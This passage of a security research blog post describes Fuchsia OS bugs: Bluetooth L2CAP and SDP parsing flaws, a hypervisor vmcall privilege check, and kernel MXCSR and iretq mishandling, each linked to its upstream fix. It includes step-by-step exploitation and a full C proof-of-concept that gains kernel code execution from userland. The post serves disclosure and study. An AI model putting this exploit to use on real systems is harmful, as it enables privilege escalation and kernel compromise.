structs.</span>\n  <span class=\"k\">static_assert</span><span class=\"p\">(</span><span class=\"n\">std</span><span class=\"o\">::</span><span class=\"n\">is_trivially_copyable_v</span><span class=\"o\">&lt;</span><span class=\"n\">T</span><span class=\"o\">&gt;</span><span class=\"p\">,</span> <span class=\"s\">\"Can not reinterpret bytes\"</span><span class=\"p\">);</span>\n  <span class=\"n\">ZX_ASSERT</span><span class=\"p\">(</span><span class=\"n\">size</span><span class=\"p\">()</span> <span class=\"o\">&gt;=</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">T</span><span class=\"p\">));</span>\n  <span class=\"k\">return</span> <span class=\"o\">*</span><span class=\"k\">reinterpret_cast</span><span class=\"o\">&lt;</span><span class=\"k\">const</span> <span class=\"n\">T</span><span class=\"o\">*&gt;</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">());</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>The out-of-bounds access will cause the assert to fire, which will kill the Bluetooth component.</p> \n   <p>Therefore, this is only a DoS (<em>Denial Of Service</em>) of the Bluetooth component and not an interesting bug from an exploitation point of view, (un)fortunately.</p> \n   <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/342a6fe56dc30e8a9a992b13ca31c3bfe954e93a\">[bt][l2cap] Check size of command reject payload</a>.</p> \n  </div> \n  <div class=\"section\" id=\"sdp-servicesearchresponse\"> \n   <h4>SDP: ServiceSearchResponse</h4> \n   <p>When parsing ServiceSearchResponse packets, the <a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols#Service_discovery_protocol_(SDP)\">SDP</a> protocol invokes the <tt class=\"docutils literal\"><span class=\"pre\">ServiceSearchResponse::Parse()</span></tt> function which has the following code:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"n\">Status</span> <span class=\"n\">ServiceSearchResponse</span><span class=\"o\">::</span><span class=\"n\">Parse</span><span class=\"p\">(</span><span class=\"k\">const</span> <span class=\"n\">ByteBuffer</span><span class=\"o\">&amp;</span> <span class=\"n\">buf</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"cm\">/* ... */</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">buf</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">()</span> <span class=\"o\">&lt;</span> <span class=\"p\">(</span><span class=\"mi\">2</span> <span class=\"o\">*</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"kt\">uint16_t</span><span class=\"p\">)))</span> <span class=\"p\">{</span>\n    <span class=\"n\">bt_log</span><span class=\"p\">(</span><span class=\"n\">SPEW</span><span class=\"p\">,</span> <span class=\"s\">\"sdp\"</span><span class=\"p\">,</span> <span class=\"s\">\"Packet too small to parse\"</span><span class=\"p\">);</span>\n    <span class=\"k\">return</span> <span class=\"nf\">Status</span><span class=\"p\">(</span><span class=\"n\">HostError</span><span class=\"o\">::</span><span class=\"n\">kPacketMalformed</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"cm\">/* ... */</span>\n  <span class=\"kt\">size_t</span> <span class=\"n\">read_size</span> <span class=\"o\">=</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"kt\">uint16_t</span><span class=\"p\">);</span>\n  <span class=\"cm\">/* ... */</span>\n  <span class=\"kt\">uint16_t</span> <span class=\"n\">record_count</span> <span class=\"o\">=</span> <span class=\"n\">betoh16</span><span class=\"p\">(</span><span class=\"n\">buf</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">(</span><span class=\"n\">read_size</span><span class=\"p\">).</span><span class=\"n\">As</span><span class=\"o\">&lt;</span><span class=\"kt\">uint16_t</span><span class=\"o\">&gt;</span><span class=\"p\">());</span>\n  <span class=\"n\">read_size</span> <span class=\"o\">+=</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"kt\">uint16_t</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">buf</span><span class=\"p\">.</span><span class=\"n\">size</span><span class=\"p\">()</span> <span class=\"o\">-</span> <span class=\"n\">read_size</span> <span class=\"o\">-</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"kt\">uint8_t</span><span class=\"p\">))</span> <span class=\"o\">&lt;</span> <span class=\"p\">(</span><span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">ServiceHandle</span><span class=\"p\">)</span> <span class=\"o\">*</span> <span class=\"n\">record_count</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"n\">bt_log</span><span class=\"p\">(</span><span class=\"n\">SPEW</span><span class=\"p\">,</span> <span class=\"s\">\"sdp\"</span><span class=\"p\">,</span> <span class=\"s\">\"Packet too small for %d records\"</span><span class=\"p\">,</span> <span class=\"n\">record_count</span><span class=\"p\">);</span>\n    <span class=\"k\">return</span> <span class=\"nf\">Status</span><span class=\"p\">(</span><span class=\"n\">HostError</span><span class=\"o\">::</span><span class=\"n\">kPacketMalformed</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kt\">uint16_t</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">record_count</span><span class=\"p\">;</span> <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">auto</span> <span class=\"n\">view</span> <span class=\"o\">=</span> <span class=\"n\">buf</span><span class=\"p\">.</span><span class=\"n\">view</span><span class=\"p\">(</span><span class=\"n\">read_size</span> <span class=\"o\">+</span> <span class=\"n\">i</span> <span class=\"o\">*</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">ServiceHandle</span><span class=\"p\">));</span>\n    <span class=\"n\">service_record_handle_list_</span><span class=\"p\">.</span><span class=\"n\">emplace_back</span><span class=\"p\">(</span><span class=\"n\">betoh32</span><span class=\"p\">(</span><span class=\"n\">view</span><span class=\"p\">.</span><span class=\"n\">As</span><span class=\"o\">&lt;</span><span class=\"kt\">uint32_t</span><span class=\"o\">&gt;</span><span class=\"p\">()));</span>\n  <span class=\"p\">}</span>\n  <span class=\"cm\">/* ... */</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>The bug is rather clear here: <tt class=\"docutils literal\">buf.size() - read_size</tt> can be equal to zero, and in that case, the whole unsigned expression <tt class=\"docutils literal\">(buf.size() - read_size - sizeof(uint8_t))</tt> wraps and becomes positive, meaning that the length check succeeds.</p> \n   <p>The code then iterates and performs out-of-bounds accesses... Except that once again, some constructions are used:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"k\">const</span> <span class=\"n\">BufferView</span> <span class=\"n\">ByteBuffer</span><span class=\"o\">::</span><span class=\"n\">view</span><span class=\"p\">(</span><span class=\"kt\">size_t</span> <span class=\"n\">pos</span><span class=\"p\">,</span> <span class=\"kt\">size_t</span> <span class=\"n\">size</span><span class=\"p\">)</span> <span class=\"k\">const</span> <span class=\"p\">{</span>\n  <span class=\"n\">ZX_ASSERT_MSG</span><span class=\"p\">(</span><span class=\"n\">pos</span> <span class=\"o\">&lt;=</span> <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">size</span><span class=\"p\">(),</span> <span class=\"s\">\"invalid offset (pos = %zu)\"</span><span class=\"p\">,</span> <span class=\"n\">pos</span><span class=\"p\">);</span>\n  <span class=\"k\">return</span> <span class=\"nf\">BufferView</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">()</span> <span class=\"o\">+</span> <span class=\"n\">pos</span><span class=\"p\">,</span> <span class=\"n\">std</span><span class=\"o\">::</span><span class=\"n\">min</span><span class=\"p\">(</span><span class=\"n\">size</span><span class=\"p\">,</span> <span class=\"k\">this</span><span class=\"o\">-&gt;</span><span class=\"n\">size</span><span class=\"p\">()</span> <span class=\"o\">-</span> <span class=\"n\">pos</span><span class=\"p\">));</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>The <tt class=\"docutils literal\">view()</tt> method catches out-of-bounds accesses. So again, this is only a DoS of the Bluetooth component, not interesting! :'(</p> \n   <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/3c2f2ca62114b840520a92f6bf25332725e09d73\">[bt][sdp] Fix buffer size check, max response size</a>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"hypervisor-vmcall-bug\"> \n  <h3>Hypervisor <tt class=\"docutils literal\">vmcall</tt> bug</h3> \n  <p>Fuchsia comes with an embedded hypervisor for both AArch64 and x86_64. It is not completely clear why this hypervisor is present; possibly, to facilitate the transition to Fuchsia, by having a guest Android or Chrome OS system run in a VM and execute Android or Chrome OS applications.</p> \n  <p>On x86, we noticed a bug in the handling of the <tt class=\"docutils literal\">vmcall</tt> instruction VMEXITs.</p> \n  <p>The hypervisor implements a <em>pvclock</em> service on <tt class=\"docutils literal\">vmcall</tt>. With this service, the guest kernel can ask the time to the hypervisor, by executing the <tt class=\"docutils literal\">vmcall</tt> instruction with a <em>guest physical address</em> (GPA) as argument. The hypervisor writes the time structure into the given GPA in memory.</p> \n  <p>However, the <tt class=\"docutils literal\">vmcall</tt> instruction is actually legal in the guest userland, and the hypervisor does not verify that the <tt class=\"docutils literal\">vmcall</tt> came from the guest kernel. Therefore, the guest userland can just execute <tt class=\"docutils literal\">vmcall</tt> with whatever GPA and have the guest kernel memory be overwritten.</p> \n  <p>This can be used in privilege escalations from the guest userland to the guest kernel. Once in the guest kernel, the attacker has more hypervisor interfaces available, and from there a VM escape vulnerability can be researched and leveraged.</p> \n  <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/11ac53d31b0914f48a5ec3d03a651e53d9c07f02\">[hypervisor][x86] Check CPL when handling a VMCALL</a>.</p> \n </div> \n <div class=\"section\" id=\"kernel-mishandling-of-mxcsr\"> \n  <h3>Kernel mishandling of <tt class=\"docutils literal\">MXCSR</tt></h3> \n  <p>The <tt class=\"docutils literal\">zx_thread_write_state()</tt> syscall allows to set the registers of a suspended thread. This syscall is accessible with just a handle on the thread, and thread creation is allowed by default to any userland program, so we can invoke this syscall.</p> \n  <p>Among others, this syscall allows to modify the registers encoding the FPU state, and in particular the <tt class=\"docutils literal\">MXCSR</tt> register on x86. This is basically a 32-bit register that has reserved bits that should remain set to zero. The problem is, Zircon doesn't disallow modifications to these reserved bits.</p> \n  <p>By using <tt class=\"docutils literal\">zx_thread_write_state()</tt> we can set <tt class=\"docutils literal\">MXCSR</tt> to <tt class=\"docutils literal\">0xFFFFFFFF</tt>, and when the suspended thread resumes a fatal <tt class=\"docutils literal\">#GP</tt> exception is raised, resulting in a kernel panic:</p> \n  <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-20_playing-around-with-the-fuchsia-operating-system/images/panic.png\" style=\"width: 521.5px; height: 411.5px;\" /> \n  <p>Of course, this is only an unexploitable panic, but we're making progress: at least we managed to hit the kernel.</p> \n  <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/7eb8c8fb29fd8b6620c66f502bbed182f1b6c5c4\">[zircon][debugger] Don't write reserved part of mxcsr register</a>.</p> \n </div> \n <div class=\"section\" id=\"kernel-mishandling-of-iretq\"> \n  <h3>Kernel mishandling of <tt class=\"docutils literal\">iretq</tt></h3> \n  <p>On x86, in order to return from an interrupt or an exception, the <tt class=\"docutils literal\">iretq</tt> instruction is used. This instruction will fault (<tt class=\"docutils literal\">#GP</tt>) if attempting to return to a <em>non-canonical address</em>, that is to say, if the return address is in the range <tt class=\"docutils literal\">0x0000800000000000</tt>-<tt class=\"docutils literal\">0xFFFF7FFFFFFFFFFF</tt>.</p> \n  <p>This fault is special: it is received with the userland <em>thread-local storage</em> (TLS) already loaded in the <tt class=\"docutils literal\">gs.base</tt> register, but with the CPL (<em>Current Privilege Level</em>) of the kernel. The <tt class=\"docutils literal\">gs.base</tt> register is basically a 64-bit register that holds a pointer to the TLS.</p> \n  <p>The <tt class=\"docutils literal\">#GP</tt> handler must be careful to switch back to the kernel TLS before continuing.</p> \n  <p>Two bugs were noticed on Fuchsia:</p> \n  <ol class=\"arabic simple\"> \n   <li>Zircon does not verify that the return addresses are canonical when returning from an interrupt or exception handler.</li> \n   <li>Zircon does not handle correctly the <tt class=\"docutils literal\">iretq</tt>-generated faults, and doesn't restore the kernel TLS in the <tt class=\"docutils literal\">#GP</tt> handler.</li> \n  </ol> \n  <p>The combination of the two means that it is possible to make <tt class=\"docutils literal\">iretq</tt> fault in the kernel, and to have the fault handler execute with the userland TLS!</p> \n  <div class=\"section\" id=\"the-tls-on-zircon\"> \n   <h4>The TLS on Zircon</h4> \n   <p>The kernel TLS on Zircon is a <tt class=\"docutils literal\">x86_percpu</tt> structure, which contains useful fields for code execution, such as <tt class=\"docutils literal\">gpf_return_target</tt> (as we will see below).</p> \n  </div> \n  <div class=\"section\" id=\"exploitation\"> \n   <h4>Exploitation</h4> \n   <p>The steps of the exploitation are the following:</p> \n   <ol class=\"arabic simple\"> \n    <li>Create a thread. The thread must not do anything (infinite loop for example).</li> \n    <li>Suspend this thread with the <tt class=\"docutils literal\">zx_task_suspend()</tt> syscall.</li> \n    <li>Use <tt class=\"docutils literal\">zx_thread_write_state()</tt> to change the <tt class=\"docutils literal\">%rip</tt> register of the suspended thread, and put a non-canonical value in it, such as <tt class=\"docutils literal\">0x00FFFFFFFFFFFFFF</tt>. Also change the value of <tt class=\"docutils literal\">gs.base</tt> to a specific value that we will call <tt class=\"docutils literal\">FakeTlsAddr</tt>.</li> \n    <li>Use the <tt class=\"docutils literal\">zx_handle_close()</tt> syscall to resume the suspended thread.</li> \n    <li>When the thread resumes, the kernel will return to it; it will execute <tt class=\"docutils literal\">swapgs</tt> (to install the userland <tt class=\"docutils literal\">gs.base</tt> value), and then <tt class=\"docutils literal\">iretq</tt>, which will fault because the <tt class=\"docutils literal\">%rip</tt> value we set is non-canonical. The kernel ends up in the <tt class=\"docutils literal\">#GP</tt> fault handler.</li> \n    <li>The <tt class=\"docutils literal\">#GP</tt> handler sees that the fault was received in the kernel, and does not execute <tt class=\"docutils literal\">swapgs</tt> because it thinks that since we came from the kernel then we must have the kernel TLS loaded. The handler therefore wrongfully stays with the userland <tt class=\"docutils literal\">gs.base</tt> value. It then calls the <tt class=\"docutils literal\">x86_exception_handler()</tt> function.</li> \n    <li><tt class=\"docutils literal\">x86_exception_handler()</tt> uses this TLS. In particular, it will quickly exit if the <tt class=\"docutils literal\">gpf_return_target</tt> field of the TLS is non-zero, and it will actually jump into this address!</li> \n    <li>The CPU jumps into <tt class=\"docutils literal\">gpf_return_target</tt> with kernel privileges.</li> \n   </ol> \n   <p>In the end, the kernel uses the structure located at <tt class=\"docutils literal\">FakeTlsAddr</tt> thinking it is a trusted <tt class=\"docutils literal\">x86_percpu</tt> structure from the kernel whereas it is actually a structure possibly controlled by userland. By placing a specific value in the <tt class=\"docutils literal\">gpf_return_target</tt> field of this fake structure, userland can begin to gain code execution in kernel mode.</p> \n   <p>Userland must choose the <tt class=\"docutils literal\">FakeTlsAddr</tt> address so that it points to a kernel buffer where userland data got copied, or to a buffer in userland directly (if there is no <tt class=\"docutils literal\">SMEP</tt>/<tt class=\"docutils literal\">SMAP</tt>).</p> \n   <p>As a toy example, we developed a simple exploit that relies on <tt class=\"docutils literal\">SMEP</tt>/<tt class=\"docutils literal\">SMAP</tt> not being present:</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"cp\">#include</span> <span class=\"cpf\">&lt;stdio.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;stdlib.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;stdint.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;pthread.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;zircon/syscalls.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;zircon/threads.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;zircon/process.h&gt;</span><span class=\"cp\"></span>\n<span class=\"cp\">#include</span> <span class=\"cpf\">&lt;zircon/syscalls/debug.h&gt;</span><span class=\"cp\"></span>\n\n<span class=\"cp\">#define __aligned(x)    __attribute__((__aligned__(x)))</span>\n<span class=\"cp\">#define __barrier()     __asm __volatile(\"\":::\"memory\")</span>\n<span class=\"cp\">#define PAGE_SIZE       4096</span>\n\n<span class=\"k\">volatile</span> <span class=\"n\">zx_handle_t</span> <span class=\"n\">MyThreadHandle</span><span class=\"p\">;</span>\n<span class=\"k\">volatile</span> <span class=\"kt\">int</span> <span class=\"n\">Ready</span><span class=\"p\">;</span>\n<span class=\"k\">volatile</span> <span class=\"kt\">int</span> <span class=\"n\">Resume</span><span class=\"p\">;</span>\n\n<span class=\"kt\">uint8_t</span> <span class=\"n\">FakeThread</span><span class=\"p\">[</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">]</span> <span class=\"n\">__aligned</span><span class=\"p\">(</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">);</span>\n<span class=\"kt\">uint8_t</span> <span class=\"n\">FakeUStack</span><span class=\"p\">[</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">]</span> <span class=\"n\">__aligned</span><span class=\"p\">(</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">);</span>\n\n<span class=\"cm\">/*</span>\n<span class=\"cm\"> * Short, simplified version of \"struct x86_percpu\". We are mainly interested</span>\n<span class=\"cm\"> * in \"gpf_return_target\" here, because it dictates where the #GP handler</span>\n<span class=\"cm\"> * returns. We make it point to a userland address.</span>\n<span class=\"cm\"> */</span>\n<span class=\"k\">union</span> <span class=\"p\">{</span>\n        <span class=\"k\">struct</span> <span class=\"n\">FakeCpu</span> <span class=\"p\">{</span>\n                <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">direct</span><span class=\"p\">;</span>\n                <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">current_thread</span><span class=\"p\">;</span>\n                <span class=\"kt\">uintptr_t</span> <span class=\"n\">stack_guard</span><span class=\"p\">;</span>\n                <span class=\"kt\">uintptr_t</span> <span class=\"n\">kernel_unsafe_sp</span><span class=\"p\">;</span>\n                <span class=\"kt\">uintptr_t</span> <span class=\"n\">saved_user_sp</span><span class=\"p\">;</span>\n                <span class=\"kt\">uint32_t</span> <span class=\"n\">blocking_disallowed</span><span class=\"p\">;</span>\n                <span class=\"k\">volatile</span> <span class=\"kt\">uint8_t</span> <span class=\"o\">*</span><span class=\"n\">monitor</span><span class=\"p\">;</span>\n                <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">idle_states</span><span class=\"p\">;</span>\n                <span class=\"kt\">uint32_t</span> <span class=\"n\">apic_id</span><span class=\"p\">;</span>\n                <span class=\"kt\">uintptr_t</span> <span class=\"n\">gpf_return_target</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span> <span class=\"n\">FakeCpu</span><span class=\"p\">;</span>\n        <span class=\"kt\">uint8_t</span> <span class=\"n\">raw</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"o\">*</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">];</span>\n<span class=\"p\">}</span> <span class=\"n\">FakeTls</span> <span class=\"n\">__aligned</span><span class=\"p\">(</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">);</span>\n\n<span class=\"cm\">/* -------------------------------------------------------------------------- */</span>\n\n<span class=\"cm\">/*</span>\n<span class=\"cm\"> * This function runs as ring0, with the context of MyThread(). Put whatever</span>\n<span class=\"cm\"> * you want in it, this basically executes as kernel code.</span>\n<span class=\"cm\"> */</span>\n<span class=\"k\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">RunAsRing0</span><span class=\"p\">(</span><span class=\"kt\">void</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n        <span class=\"kr\">__asm</span> <span class=\"k\">volatile</span> <span class=\"p\">(</span>\n                <span class=\"cm\">/* ... */</span>\n                <span class=\"s\">\"1: jmp 1b</span><span class=\"se\">\\n</span><span class=\"s\">\"</span>\n        <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"cm\">/*</span>\n<span class=\"cm\"> * Expose the handle of the thread. Kinda annoying to do, I didn't find a way</span>\n<span class=\"cm\"> * to retrieve that handle from the parent thread directly (the thing is hidden</span>\n<span class=\"cm\"> * inside pthread etc).</span>\n<span class=\"cm\"> */</span>\n<span class=\"k\">static</span> <span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"nf\">MyThread</span><span class=\"p\">(</span><span class=\"kt\">void</span> <span class=\"o\">*</span><span class=\"n\">arg</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Thread] Started</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n        <span class=\"n\">MyThreadHandle</span> <span class=\"o\">=</span> <span class=\"n\">zx_thread_self</span><span class=\"p\">();</span>\n        <span class=\"n\">__barrier</span><span class=\"p\">();</span>\n        <span class=\"n\">Ready</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n        <span class=\"n\">__barrier</span><span class=\"p\">();</span>\n        <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">Resume</span><span class=\"p\">);</span>\n        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Thread] Resumed</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n        <span class=\"k\">return</span> <span class=\"nb\">NULL</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">main</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">argc</span><span class=\"p\">,</span> <span class=\"kt\">char</span><span class=\"o\">**</span> <span class=\"n\">argv</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n        <span class=\"n\">zx_thread_state_general_regs_t</span> <span class=\"n\">regs</span><span class=\"p\">;</span>\n        <span class=\"n\">zx_handle_t</span> <span class=\"n\">token</span><span class=\"p\">;</span>\n        <span class=\"n\">zx_status_t</span> <span class=\"n\">res</span><span class=\"p\">;</span>\n        <span class=\"n\">pthread_t</span> <span class=\"n\">thid</span><span class=\"p\">;</span>\n\n        <span class=\"n\">pthread_create</span><span class=\"p\">(</span><span class=\"o\">&amp;</span><span class=\"n\">thid</span><span class=\"p\">,</span> <span class=\"nb\">NULL</span><span class=\"p\">,</span> <span class=\"n\">MyThread</span><span class=\"p\">,</span> <span class=\"nb\">NULL</span><span class=\"p\">);</span>\n\n        <span class=\"cm\">/*</span>\n<span class=\"cm\">         * Wait for the handle to be exposed...</span>\n<span class=\"cm\">         */</span>\n        <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"n\">Ready</span><span class=\"p\">);</span>\n\n        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Main] Ready</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n\n        <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">zx_task_suspend</span><span class=\"p\">(</span><span class=\"n\">MyThreadHandle</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">token</span><span class=\"p\">);</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">res</span> <span class=\"o\">!=</span> <span class=\"n\">ZX_OK</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Main] zx_task_suspend failed: %d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">res</span><span class=\"p\">);</span>\n                <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Main] Suspended</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n\n        <span class=\"n\">FakeTls</span><span class=\"p\">.</span><span class=\"n\">FakeCpu</span><span class=\"p\">.</span><span class=\"n\">direct</span> <span class=\"o\">=</span> <span class=\"o\">&amp;</span><span class=\"n\">FakeTls</span><span class=\"p\">;</span>\n        <span class=\"n\">FakeTls</span><span class=\"p\">.</span><span class=\"n\">FakeCpu</span><span class=\"p\">.</span><span class=\"n\">current_thread</span> <span class=\"o\">=</span> <span class=\"n\">FakeThread</span><span class=\"p\">;</span>\n        <span class=\"n\">FakeTls</span><span class=\"p\">.</span><span class=\"n\">FakeCpu</span><span class=\"p\">.</span><span class=\"n\">gpf_return_target</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">uintptr_t</span><span class=\"p\">)</span><span class=\"o\">&amp;</span><span class=\"n\">RunAsRing0</span><span class=\"p\">;</span>\n        <span class=\"n\">FakeTls</span><span class=\"p\">.</span><span class=\"n\">FakeCpu</span><span class=\"p\">.</span><span class=\"n\">kernel_unsafe_sp</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">uintptr_t</span><span class=\"p\">)</span><span class=\"o\">&amp;</span><span class=\"n\">FakeUStack</span><span class=\"p\">[</span><span class=\"n\">PAGE_SIZE</span><span class=\"p\">];</span>\n\n        <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">zx_thread_read_state</span><span class=\"p\">(</span><span class=\"n\">MyThreadHandle</span><span class=\"p\">,</span>\n            <span class=\"n\">ZX_THREAD_STATE_GENERAL_REGS</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">regs</span><span class=\"p\">,</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">regs</span><span class=\"p\">));</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">res</span> <span class=\"o\">!=</span> <span class=\"n\">ZX_OK</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Main] zx_thread_read_state failed: %d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">res</span><span class=\"p\">);</span>\n                <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"n\">regs</span><span class=\"p\">.</span><span class=\"n\">gs_base</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">uintptr_t</span><span class=\"p\">)</span><span class=\"o\">&amp;</span><span class=\"n\">FakeTls</span><span class=\"p\">;</span> <span class=\"cm\">/* Our fake TLS */</span>\n        <span class=\"n\">regs</span><span class=\"p\">.</span><span class=\"n\">rip</span> <span class=\"o\">=</span> <span class=\"mh\">0x00FFFFFFFFFFFFFF</span><span class=\"p\">;</span> <span class=\"cm\">/* A non-canonical address */</span>\n\n        <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">zx_thread_write_state</span><span class=\"p\">(</span><span class=\"n\">MyThreadHandle</span><span class=\"p\">,</span>\n            <span class=\"n\">ZX_THREAD_STATE_GENERAL_REGS</span><span class=\"p\">,</span> <span class=\"o\">&amp;</span><span class=\"n\">regs</span><span class=\"p\">,</span> <span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">regs</span><span class=\"p\">));</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">res</span> <span class=\"o\">!=</span> <span class=\"n\">ZX_OK</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Main] zx_thread_write_state failed: %d</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">,</span> <span class=\"n\">res</span><span class=\"p\">);</span>\n                <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n\n        <span class=\"n\">Resume</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n        <span class=\"n\">zx_handle_close</span><span class=\"p\">(</span><span class=\"n\">token</span><span class=\"p\">);</span> <span class=\"cm\">/* The thread resumes */</span>\n\n        <span class=\"n\">pthread_join</span><span class=\"p\">(</span><span class=\"n\">thid</span><span class=\"p\">,</span> <span class=\"nb\">NULL</span><span class=\"p\">);</span>\n        <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[Main] Survived! Exploit failed?!</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span>\n        <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre> \n   </div> \n   <p>With it, we are able to gain kernel code execution from a regular userland process.</p> \n   <p>Fix: <a class=\"reference external\" href=\"https://fuchsia.googlesource.com/fuchsia/+/0054a8a1162c2ea857fb02553835b804ead7b124\">[zircon][debugger] Disallow setting non-canonical rip addresses</a>.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"others\"> \n  <h3>Others</h3> \n  <p>Some other uninteresting bugs were found, such as:</p> \n  <ul 